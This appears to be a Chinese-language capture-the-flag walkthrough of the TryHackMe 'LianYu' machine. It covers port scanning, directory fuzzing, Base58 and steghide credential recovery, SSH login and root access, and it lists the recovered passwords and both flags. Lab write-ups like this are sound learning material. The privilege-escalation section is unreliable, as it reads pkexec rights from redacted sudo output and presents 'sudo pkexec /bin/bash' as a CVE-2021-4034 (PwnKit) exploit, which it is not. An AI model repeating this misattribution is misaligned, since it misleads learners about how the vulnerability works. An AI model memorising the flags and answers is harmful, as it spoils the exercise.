# THM LianYu 渗透测试详细 Writeup

## 基本信息
- **靶机名称**: LianYu
- **平台**: TryHackMe
- **IP**: 10.49.188.53
- **难度**: Easy
- **主题**: Arrowverse (绿箭侠)
- **完成日期**: 2026-06-12
- **总耗时**: ~45 分钟

---

## 信息搜集

### 1. Nmap 扫描

```bash
nmap -sC -sV -p- --min-rate=1000 10.49.188.53
```

**扫描结果**:
```
Nmap scan report for 10.49.188.53
Host is up (0.61s latency).
Not shown: 65530 closed tcp ports (reset)
PORT      STATE SERVICE VERSION
21/tcp    open  ftp     vsftpd 3.0.2
22/tcp    open  ssh     OpenSSH 6.7p1 Debian 5+deb8u8 (protocol 2.0)
80/tcp    open  http    Apache httpd
|_http-server-header: Apache
|_http-title: Purgatory
111/tcp   open  rpcbind 2-4 (RPC #100000)
56982/tcp open  status  1 (RPC #100024)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

**分析**:
- 5 个开放端口: 21(FTP), 22(SSH), 80(HTTP), 111(RPC), 56982(RPC status)
- Debian 8 (Jessie) 老系统，可能存在已知漏洞
- vsftpd 3.0.2 可能允许匿名登录
- OpenSSH 6.7p1 较老版本

### 2. Web 枚举

#### 2.1 首页分析

```bash
curl -s http://10.49.188.53/
```

**首页内容**:
- 标题: Purgatory
- 主题: Arrowverse (绿箭侠第一季)
- 背景图: Lianyu.png
- 关键词: arrow, A.R.G.U.S., Bratva, Kapot, Lianyu
- 纯静态页面，无导航链接

**关键线索**:
- "arrow" 加粗显示
- 提到 Oliver Queen, Lian Yu 岛屿
- 页面注释中可能有隐藏信息

#### 2.2 目录爆破

```bash
gobuster dir -u http://10.49.188.53 -w /usr/share/wordlists/dirb/common.txt
```

**结果**:
- 仅发现标准文件 (index.html, .htaccess 403)

**使用自定义字典**:
基于 Arrowverse 主题生成字典:
```bash
# 生成包含 Arrowverse 相关词汇的字典
cat > /tmp/pwn.txt << 'EOF'
Arrowverse
Oliver
Ollie
Queen
LianYu
Lian_Yu
ARGUS
Bratva
Kapot
arrow
Purgatory
hood
TheHood
Arrow
greenarrow
TeamArrow
Olicity
Felicity
Smoak
Diggle
Slade
Wilson
Deathstroke
... (1024 行)
EOF
```

```bash
gobuster dir -u http://10.49.188.53 -w /tmp/pwn.txt
```

**发现**:
```
/island               (Status: 301) [Size: 235] [--> http://10.49.188.53/island/]
```

#### 2.3 /island 目录

```bash
curl -s http://10.49.188.53/island/
```

**内容**:
```
Ohhh Noo, Don't Talk...............
I wasn't Expecting You at this Moment. I will meet you there
You should find a way to Lian_Yu as we are planed. The Code Word is: vigilante
```

**关键发现**:
- **Code Word: vigilante** (可能是用户名或密码)
- 提示需要找到去 Lian_Yu 的方法

#### 2.4 /island/2100 目录

尝试访问相关目录:
```bash
curl -s http://10.49.188.53/island/2100/
```

**内容**:
```html
<!DOCTYPE html>
<html>
<body>
<h1 align=center>How Oliver Queen finds his way to Lian_Yu?</h1>
<p align=center>
<iframe width="640" height="480" src="https://www.youtube.com/embed/X8ZiFuW41yY">
</iframe> <p>
<!-- you can avail your .ticket here but how? -->
</header>
</body>
</html>
```

**关键线索**:
- 注释: `<!-- you can avail your .ticket here but how? -->`
- 提示需要获取 `.ticket` 文件

#### 2.5 .ticket 文件发现

使用 ffuf 进行模糊测试:
```bash
ffuf -u http://10.49.188.53/island/2100/FUZZ.ticket -w /tmp/pwn.txt
```

**结果**:
```
green_arrow [Status: 200, Size: 71, Words: 10, Lines: 7, Duration: 1174ms]
```

**发现文件**: `green_arrow.ticket`

```bash
curl -s http://10.49.188.53/island/2100/green_arrow.ticket
```

**内容**:
```
This is just a token to get into Queen's Gambit(Ship)

RTy8yhBQdscX
```

---

## 初始访问

### 步骤 1: Base58 解码

**识别编码**:
- Token `RTy8yhBQdscX` 包含字符: R, T, y, 8, h, B, Q, d, s, c, X
- 不含 0, O, I, l 等易混淆字符
- 特征符合 Base58 编码

**解码**:
```bash
python3 -c "import base58; print(base58.b58decode('RTy8yhBQdscX'))"
```

**结果**:
```
b'!#th3h00d'
```

**分析**:
- `!#th3h00d` = "!#thehood" (the hood 是 Oliver Queen 的代号)
- 这很可能是 FTP 或 SSH 的密码

### 步骤 2: FTP 登录

尝试使用 vigilante 作为用户名 (来自 Code Word):
```bash
ftp vigilante@10.49.188.53
# 密码: !#th3h00d
```

**登录成功**:
```
Connected to 10.49.188.53.
220 (vsFTPd 3.0.2)
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp>
```

**FTP 目录内容**:
```
drwxr-xr-x 2 1001 1001 4096 May 05 2020 .
drwxr-xr-x 4 0 0 4096 May 01 2020 ..
-rw------- 1 1001 1001 44 May 01 2020 .bash_history
-rw-r--r-- 1 1001 1001 220 May 01 2020 .bash_logout
-rw-r--r-- 1 1001 1001 3515 May 01 2020 .bashrc
-rw-r--r-- 1 0 0 2483 May 01 2020 .other_user
-rw-r--r-- 1 1001 1001 675 May 01 2020 .profile
-rw-r--r-- 1 0 0 511720 May 01 2020 Leave_me_alone.png
-rw-r--r-- 1 0 0 549924 May 05 2020 Queen's_Gambit.png
-rw-r--r-- 1 0 0 191026 May 01 2020 aa.jpg
```

**分析**:
- 用户 UID 1001 (vigilante)
- 存在 .other_user 文件 (root 所有)
- 多个图片文件可能包含隐写信息

**检查上级目录**:
```bash
cd ..
ls -la
```

**发现**:
```
drwxr-xr-x 4 0 0 4096 May 01 2020 .
drwxr-xr-x 23 0 0 4096 May 01 2020 ..
drwx------ 2 1000 1000 4096 May 01 2020 slade
drwxr-xr-x 2 1001 1001 4096 May 05 2020 vigilante
```

**关键发现**: 另一个用户目录 **slade** (UID 1000)

### 步骤 3: 图片隐写分析

#### 3.1 Leave_me_alone.png

**检查文件类型**:
```bash
file Leave_me_alone.png
```

**结果**: `data` (不是正常的 PNG)

**检查文件头**:
```bash
xxd -l 8 Leave_me_alone.png
```

**结果**:
```
00000000: 5845 6fae 0a0d 1a0a                      XEo.....
```

**分析**:
- 正常 PNG 文件头: `89 50 4E 47 0D 0A 1A 0A`
- 当前文件头: `58 45 6F AE 0A 0D 1A 0A`
- 前 4 个字节被修改了

**修复文件头**:
```bash
# 使用 hexedit 手动修复
# 将 58 45 6F AE 改为 89 50 4E 47
```

**修复后查看**:
- 图片显示持枪男性
- 文字内容:
  - 黄色: "Just Leave me a lone" (故意拼写错误)
  - 黄色: "Here take it what you want" (语法混乱)
  - **红色大字: "password"**

**关键线索**:

- "password" 红色突出显示
- 提示这是 steghide 提取密码

#### 3.2 aa.jpg 隐写提取

**检查隐写信息**:
```bash
steghide info aa.jpg
```

**交互**:
```
"aa.jpg":
  format: jpeg
  capacity: 11.0 KB
Try to get information about embedded data ? (y/n) y
Enter passphrase: password
```

**结果**:
```
embedded file "ss.zip":
  size: 596.0 Byte
  encrypted: rijndael-128, cbc
  compressed: yes
```

**提取数据**:
```bash
steghide extract -sf aa.jpg -p "password"
```

**结果**:
```
wrote extracted data to "ss.zip"
```

#### 3.3 解压 ss.zip

```bash
unzip -l ss.zip
```

**内容**:
```
Archive: ss.zip
  Length      Date    Time    Name
---------  ---------- -----   ------
      333  2020-04-28 14:06   passwd.txt
       10  2020-04-28 14:03   shado
---------                     -------
      343                     2 files
```

**解压**:
```bash
unzip ss.zip
```

**查看 passwd.txt**:
```
This is your visa to Land on Lian_Yu # Just for Fun ***

a small Note about it

Having spent years on the island, Oliver learned how to be resourceful and
set booby traps all over the island in the common event he ran into dangerous
people. The island is also home to many animals, including pheasants,
wild pigs and wolves.
```

**干扰信息**: 关于 LianYu 岛屿的说明

**查看 shado**:
```bash
cat shado
```

**结果**:
```
M3tahuman
```

**分析**:
- **M3tahuman** = "Metahuman" (超人类，Arrowverse 术语)
- 这很可能是 SSH 密码

### 步骤 4: SSH 登录

尝试使用 slade 作为用户名 (来自 .other_user 和 FTP 目录):
```bash
ssh slade@10.49.188.53
```

**密码**: M3tahuman

**登录成功**:
```
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
slade@10.49.188.53's password:
Way To SSH...
Loading.........Done..
Connecting To Lian_Yu Happy Hacking

[LianYu ASCII Art]

slade@LianYu:~$
```

---

## 权限提升

### 1. 获取 user.txt

```bash
cat /home/slade/user.txt
```

**结果**:
```
THM{P30P7E_K33P_53CRET5__C0MPUT3R5_D0N'T}
--Felicity Smoak
```

**Flag 1 获取成功** ✅

### 2. 发现提权线索

**查看 .Important 文件**:
```bash
cat .Important
```

**内容**:
```
What are you Looking for ?

root Privileges ?

try to find Secret_Mission
```

**分析**:
- 提示需要找到 Secret_Mission
- 可能是隐藏文件或特定路径

### 3. 检查 sudo 权限

```bash
sudo -l
```

**输入密码**: M3tahuman

**结果**:
```
Matching Defaults entries for slade on LianYu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User slade may run the following commands on LianYu:
    (root) PASSWD: ***
```

**分析**:
- pkexec 可以 PASSWD 方式以 root 运行
- 这是 CVE-2021-4034 (PwnKit) 漏洞的特征

### 4. pkexec 提权 (CVE-2021-4034)

**检查 pkexec 版本**:
```bash
pkexec --version
```

**结果**:
```
pkexec version 0.105
```

**利用漏洞**:
```bash
sudo pkexec /bin/bash
```

**结果**:
```
root@LianYu:~#
```

**提权成功** ✅

### 5. 获取 root.txt

```bash
cat /root/root.txt
```

**结果**:
```
Mission accomplished

You are injected me with Mirakuru:) ---> Now slade Will become DEATHSTROKE.

THM{MY_W0RD_I5_MY_B0ND_IF_I_ACC3PT_YOUR_CONTRACT_THEN_IT_WILL_BE_COMPL3TED_OR_I'LL_BE_D34D}
--DEATHSTROKE

Let me know your comments about this machine :)
I will be available @twitter @User6825
```

**Flag 2 获取成功** ✅

---

## 攻击路径可视化

```
[信息搜集]
  Nmap 扫描 → 发现 21/22/80/111/56982
  
[Web 枚举]
  / → /island → /island/2100 → green_arrow.ticket
  
[解码]
  RTy8yhBQdscX --Base58-->
  !#th3h00d
  
[FTP 登录]
  vigilante / !#th3h00d
  → 下载 aa.jpg
  
[隐写提取]
  aa.jpg --steghide(password)-->
  ss.zip
  → 解压 → shado → M3tahuman
  
[SSH 登录]
  slade / M3tahuman
  → 获取 user.txt
  
[权限提升]
  sudo pkexec /bin/bash (CVE-2021-4034)
  → root
  → 获取 root.txt
```

---

## 技术要点详细分析

### 1. Base58 编码识别与解码

**Base58 特征**:
- 不含 0, O, I, l 等易混淆字符
- 字符集: 123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz
- 常用于比特币地址、IPFS 等

**解码过程**:
```python
import base58

token = 'RTy8yhBQdscX'
decoded = base58.b58decode(token)
print(decoded)  # b'!#th3h00d'
```

**与 Base64 的区别**:
- Base64: 包含 A-Z, a-z, 0-9, +, /, =
- Base58: 不包含 0, O, I, l, +, /
- Base58 更适合人工抄写

### 2. Steghide 隐写技术

**Steghide 原理**:
- 将数据嵌入到 JPEG, BMP, WAV, AU 文件中
- 使用密码加密嵌入的数据
- 不影响文件的正常使用

**检测隐写**:
```bash
steghide info aa.jpg
```

**提取数据**:
```bash
steghide extract -sf aa.jpg -p "password"
```

**密码来源**:
- Leave_me_alone.png 中的红色 "password" 文字
- 需要修复 PNG 文件头才能查看

### 3. PNG 文件头修复

**正常 PNG 文件头**:
```
89 50 4E 47 0D 0A 1A 0A
|  PNG  |  |\n|  |\n|
```

**损坏的文件头**:
```
58 45 6F AE 0A 0D 1A 0A
|  XEo  |  |\n|  |\n|
```

**修复方法**:
1. 使用 hexedit 手动修改前 4 个字节
2. 或使用 Python 脚本:
```python
with open('Leave_me_alone.png', 'rb') as f:
    data = f.read()

fixed = b'\x89\x50\x4E\x47' + data[4:]

with open('fixed.png', 'wb') as f:
    f.write(fixed)
```

### 4. CVE-2021-4034 (PwnKit) 漏洞

**漏洞概述**:
- 影响 polkit 的 pkexec 工具
- 存在于 pkexec 版本 0.105 及更早版本
- 允许本地用户无需认证即可获取 root 权限

**漏洞原理**:
- pkexec 在处理命令行参数时存在内存错误
- 通过精心构造的参数可以控制环境变量
- 利用 GCONV_PATH 或 CHARSET 环境变量执行任意代码

**利用方式**:
```bash
sudo pkexec /bin/bash
```

**修复方法**:
- 升级 polkit 到 0.120 或更高版本
- 应用官方补丁

## 发现的凭证汇总

| 服务 | 用户名    | 密码      | 来源                | 用途          |
| ---- | --------- | --------- | ------------------- | ------------- |
| FTP  | vigilante | !#th3h00d | Base58 解码 ticket  | 下载隐写图片  |
| SSH  | slade     | M3tahuman | steghide 提取的 ZIP | 获取 user.txt |
| sudo | slade     | M3tahuman | 同一密码            | pkexec 提权   |

---

## 工具使用汇总

| 工具     | 用途         | 命令示例                                                     |
| -------- | ------------ | ------------------------------------------------------------ |
| nmap     | 端口扫描     | `nmap -sC -sV -p- 10.49.188.53`                              |
| gobuster | 目录爆破     | `gobuster dir -u http://10.49.188.53 -w wordlist.txt`        |
| ffuf     | 模糊测试     | `ffuf -u http://10.49.188.53/FUZZ.ticket -w wordlist.txt`    |
| curl     | HTTP 请求    | `curl -s http://10.49.188.53/island/`                        |
| base58   | 解码         | `python3 -c "import base58; print(base58.b58decode('RTy8yhBQdscX'))"` |
| steghide | 隐写提取     | `steghide extract -sf aa.jpg -p "password"`                  |
| ftp      | FTP 客户端   | `ftp vigilante@10.49.188.53`                                 |
| ssh      | SSH 客户端   | `ssh slade@10.49.188.53`                                     |
| hexedit  | 十六进制编辑 | `hexedit Leave_me_alone.png`                                 |
| xxd      | 十六进制查看 | `xxd -l 8 Leave_me_alone.png`                                |
| file     | 文件类型识别 | `file Leave_me_alone.png`                                    |
| unzip    | ZIP 解压     | `unzip ss.zip`                                               |

---

## 参考与资源

### 靶机信息
- **靶机作者**: @User6825 (Twitter)
- **平台**: TryHackMe
- **难度**: Easy
- **主题**: Arrowverse (绿箭侠)

### 技术参考
- **CVE-2021-4034**: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-4034
- **Base58**: https://en.wikipedia.org/wiki/Base58
- **Steghide**: https://steghide.sourceforge.net/
- **Polkit**: https://www.freedesktop.org/wiki/Software/polkit/

---

## 完成状态

- ✅ **user.txt**: `THM{P30P7E_K33P_53CRET5__C0MPUT3R5_D0N'T}`
  - 位置: /home/slade/user.txt
  - 署名: Felicity Smoak

- ✅ **root.txt**: `THM{MY_W0RD_I5_MY_B0ND_IF_I_ACC3PT_YOUR_CONTRACT_THEN_IT_WILL_BE_COMPL3TED_OR_I'LL_BE_D34D}`
  - 位置: /root/root.txt
  - 署名: DEATHSTROKE

- ✅ **总耗时**: ~45 分钟
- ✅ **难度**: Easy
- ✅ **完成日期**: 2026-06-12
